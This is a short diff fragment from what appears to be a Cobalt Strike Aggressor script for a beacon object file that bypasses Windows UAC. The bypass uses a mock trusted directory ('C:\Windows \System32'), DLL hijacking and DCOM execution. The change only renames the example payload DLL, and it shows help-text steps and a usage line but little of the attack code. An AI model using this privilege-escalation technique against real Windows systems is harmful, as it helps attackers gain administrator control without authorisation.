@@ -10,7 +10,7 @@ Step 5: Use DCOM to execute \"C:\\Windows \\System32\\<desired executable>\"
 Step 6: Delete the DLL payload on \"C:\\Windows\\Tasks\"
 ================================================================================
 
-Example: bof-trustedpath-uacbypass ComputerFaults.exe /root/edputils.dll");
+Example: bof-trustedpath-uacbypass ComputerFaults.exe /root/edputil.dll");
 
 alias bof-trustedpath-uacbypass {
 	local('$args');
